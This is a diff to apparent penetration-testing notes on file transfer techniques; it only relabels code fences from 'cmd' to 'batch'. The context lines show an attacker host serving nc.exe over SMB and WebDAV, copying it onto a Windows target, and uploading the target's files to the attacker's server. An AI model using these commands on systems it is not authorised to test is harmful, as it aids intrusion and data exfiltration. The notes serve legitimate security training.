@@ -89,7 +89,7 @@ sudo impacket-smbserver [shareName] -smb2support /tmp/smbshare
 ```
 
 We can then copy the file to our target system
-```cmd
+```batch
 copy \\<ip>\share\nc.exe
 ```
 > Sometimes this will be blocked by modern windows systems as guest authentication is disabled. To fix this we can create an SMB server with a username and password.
@@ -99,7 +99,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password te
 ```
 
 On the target system, mount and then copy the file
-```cmd
+```batch
 net use n: \\<ip>\share /user:test test
 copy n:\nc.exe
 ```
@@ -114,7 +114,7 @@ sudo wsgidav --host=<ip> --port=80 --root=/tmp --auth=anonymous
 ```
 
 To then check a connection to the server on the target:
-```cmd
+```batch
 dir \\<ip>\DavWWWRoot
 
 dir \\<ip>\<sharename>
@@ -122,7 +122,7 @@ dir \\<ip>\<sharename>
 > The *DavWWWRoot* keyword is recognised by the Windows Shell. No folder exists on the server with that name but it tells the Mini-Redirector driver, which handles WebDAV, to connect to the root of the WebDAV server. This keyword can be avoided by specifying a folder that exists on the server.
 
 You can then upload files:
-```cmd
+```batch
 copy <File Path> \\<ip>\DavWWWRoot\
 copy <File Path> \\<ip>\<sharefolder>\
 ```
